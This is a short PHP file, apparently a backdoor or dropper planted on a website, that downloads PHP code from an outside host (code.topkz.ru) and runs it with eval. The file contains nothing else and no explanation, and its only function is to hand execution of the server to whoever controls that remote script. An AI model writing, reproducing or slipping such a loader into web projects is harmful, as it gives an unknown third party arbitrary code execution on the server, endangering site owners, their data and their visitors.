<?php
$path = "https://code.topkz.ru/fgd/8/venoras.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
